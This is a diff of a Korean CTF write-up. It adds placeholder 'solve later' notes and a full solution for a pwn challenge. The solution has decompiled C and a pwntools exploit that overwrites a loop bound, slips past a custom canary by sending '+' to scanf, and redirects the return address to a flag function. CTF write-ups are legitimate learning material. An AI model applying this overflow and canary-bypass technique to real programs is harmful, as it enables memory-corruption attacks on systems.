@@ -475,11 +475,15 @@ ip와 port가 주어지는데 wireshark 패킷 캡쳐를 켜놓고 `nc 1.209.148
 
 이건 Forensic PNG LSB문제 같은데 복구하라는거 같다.
 
+추후에 풀겠슴니다.
+
 ## Q7
 
 ![](https://user-images.githubusercontent.com/32904385/65372534-a27b8380-dcac-11e9-8330-922ffcc4fbbe.png)
 
 swift로 만들어진 .app 파일을 준다.
+
+추후에 풀겠슴니다.
 
 
 
@@ -489,11 +493,75 @@ swift로 만들어진 .app 파일을 준다.
 
 Unity Reversing 문제이다.
 
+추후에 풀겠슴니다.
+
 ## Q9
 
 ![](https://user-images.githubusercontent.com/32904385/65372516-647e5f80-dcac-11e9-8e96-5f9d7e23bf2a.png)
 
-포나블 . . 
+full relro, nx, pie가 걸려있고 따로 custom canary가 존재한다.
+여기서 canary는 srand(time(0))로 rand값 가져오지만 scanf(%d,var[i])처럼 i 범위를 넘어서 카나리 값을 입력할 수 있을때 원래는 숫자만 가능하지만 문자가 입력되면 문자가 버퍼에 남아 %d를 통과하지만 +,-는 예외다. 버퍼에남지도 않고 해당 변수에 아무 값도 저장하지 않으므로 Canary bypass가 가능하다. 그래서 카나리를 손상시키지않고 return addresss만 변조시킬수 있다.
+
+```c
+int coal_mine()
+{
+  unsigned int v0; // eax
+  int v2[16]; // [esp+8h] [ebp-60h]
+  char name; // [esp+48h] [ebp-20h]
+  int v4; // [esp+58h] [ebp-10h]
+  int i; // [esp+5Ch] [ebp-Ch]
+
+  memset(v2, 0, sizeof(v2));
+  v0 = time(0);
+  srand(v0);
+  my_canary = rand();
+  v2[0] = my_canary;
+  v4 = 10;
+  printf("Mine worker ID : ");
+  fflush(stdout);
+  __isoc99_scanf("%24s", &name);
+  for ( i = 0; i < v4; ++i )
+  {
+    printf("Mineral%d : ", i + 1);
+    fflush(stdout);
+    __isoc99_scanf("%u", &v2[i]);
+  }
+  for ( i = 0; i < v4; ++i )
+    printf("%d. 0x%08u\n", i, v2[i]);
+  if ( v2[0] != my_canary )
+  {
+    puts("you can't escape my coal mine ..");
+    exit(0);
+  }
+  return puts("my canaria is uninfected. i'm safety !");
+}
+```
+
+v4를 조작해서 ebp-60에서 리턴 위치인 ebp+4까지 갈 수 있는 크기를 만들어주고 Canary는 +,-로 bypass해주면 된다.
+마지막 ebp+4의 값은 treasure위치로 바꿔주면 된다. 그러면 treasure로 가서 flag를 딸 수있다.
+
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+e = ELF('./coal_mine')
+p = process('./coal_mine')
+
+p.recvuntil('GOAL(')
+magic = int(p.recv(10),16)
+log.info('treasure : ' + hex(magic))
+
+p.sendlineafter(': ','A'*16 + p32(26))
+p.sendlineafter(':','+')
+for i in range(24):
+    p.sendlineafter(':','+')
+p.sendlineafter(':',str(magic))
+p.interactive()
+```
+
+**FLAG : `??????`**
+
+<br />
 
 ## Q10
 
